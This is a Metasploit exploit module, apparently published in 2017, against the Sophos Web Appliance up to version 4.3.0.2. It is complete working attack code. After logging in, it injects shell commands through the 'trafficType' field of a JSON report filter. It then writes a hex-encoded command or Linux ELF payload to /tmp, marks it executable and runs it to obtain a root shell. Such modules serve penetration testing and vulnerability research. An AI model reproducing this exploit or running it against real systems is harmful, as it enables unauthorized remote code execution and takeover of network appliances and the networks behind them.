# Date: 01/28/2017
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sophos.com
# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
# Version: 4.3.0.2
# Tested on: 4.3.0.2
#            
# CVE : (awaiting cve) 
 
# vuln:  report command / trafficType JSON parameter /  ???.php exploit
 
# Description PostAuth Sophos Web App FW <= v4.3.0.2 for capablities. This exploit leverages a command injection bug. 
#
# xort @ Critical Start
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sophos Web Appliace <= v4.3.0.2 JSON reporting remote exploit&#039;,
                    &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in
                the Sophos Web Appliace Version <=  v4.3.0.2. The vulnerability exist in
                a section of the machine&#039;s reporting inferaface that accepts unsanitized 
                unser supplied information within a JSON query. 
            },
            &#039;Author&#039;         =>
                [
                    &#039;xort@Critical Start&#039;, # vuln + metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;none&#039;, &#039;none&#039;],
                ],
            &#039;Platform&#039;      => [ &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
             &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },
 
            &#039;Targets&#039;        =>
                [
                    [&#039;Linux Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ],
                ],
            &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),    
                        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),    
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
                    Opt::RPORT(443),
                ], self.class)
    end
 
        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )
 
                # vars
                timeout = 1550;
                style_key = Rex::Text.rand_text_hex(32)
 
                # send request  
                res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/index.php",
                      &#039;vars_get&#039; => {
               &#039;c&#039; => &#039;login&#039;,
            },
                      &#039;vars_post&#039; =>
                        {
 
                  &#039;STYLE&#039; => style_key,
              &#039;destination&#039; => &#039;&#039;,
              &#039;section&#039; => &#039;&#039;,
              &#039;username&#039; => username,
              &#039;password&#039; => password_clear
                        },
                  &#039;headers&#039; => {
                          &#039;Connection&#039; => &#039;close&#039;,
                      }
 
                }, timeout)
 
                return style_key
        end
 
    def run_command(username, style_password, cmd)
 
        vprint_status( "Running Command...\n" )
 
        # send request with payload 
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
                        &#039;uri&#039;     => "/index.php",
            &#039;vars_post&#039; => {
                &#039;chart&#039; => &#039;pie&#039;,
                &#039;period&#039; => &#039;custom&#039;,
                &#039;multiplier&#039; => &#039;1&#039;,
                &#039;metric&#039; => &#039;&#039;,
                &#039;token&#039; => &#039;0.3156784180233425&#039;,
                &#039;start&#039; => &#039;1/27/2017&#039;,
                &#039;end&#039; => &#039;1/27/2017&#039;,
                &#039;filters&#039; => &#039;{"topn": "25", "trafficType": "out|&#039;+cmd+&#039;&", "department": "sophos_swa_all_departments"}&#039;,    
                &#039;pdf&#039; => &#039;1&#039;,
                &#039;test&#039; => &#039;&#039;,    
                &#039;STYLE&#039; => style_password ,
                },
            &#039;vars_get&#039; => {
                &#039;c&#039; => &#039;report&#039;,
                &#039;name&#039; => &#039;traf_users&#039;,
                &#039;STYLE&#039; => style_password ,
            },
        })
 
    end
 
     
    def exploit
        # timeout
        timeout = 1550;
 
        # params
        password_clear = datastore[&#039;PASSWORD&#039;]
        user = datastore[&#039;USERNAME&#039;]
 
        # do authentication     
        style_hash = do_login(user, password_clear)
     
        vprint_status("STATUS hash authenticated: #{style_hash}\n")
             
        # pause to let things run smoothly
        sleep(2)
 
         #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
 
                        cmd = datastore[&#039;CMD&#039;]
 
                        # Encode cmd payload
 
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\\\\\\\\\\\\x\1\2&#039;)
 
            # upload elf to /tmp/n , chmod +rx /tmp/n , then run /tmp/n (payload)
                        run_command(user, style_hash, ("echo -e #{encoded_cmd}>/tmp/n;chmod +rx /tmp/n;/tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\\\\\\\\\\\\x\1\2&#039;)
 
            # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command(user, style_hash, ("(echo -e #{encoded_elf}>/tmp/m;chmod +rx /tmp/m;/tmp/m)"))
 
            # wait for magic
                        handler
             
                end
 
 
    end
end

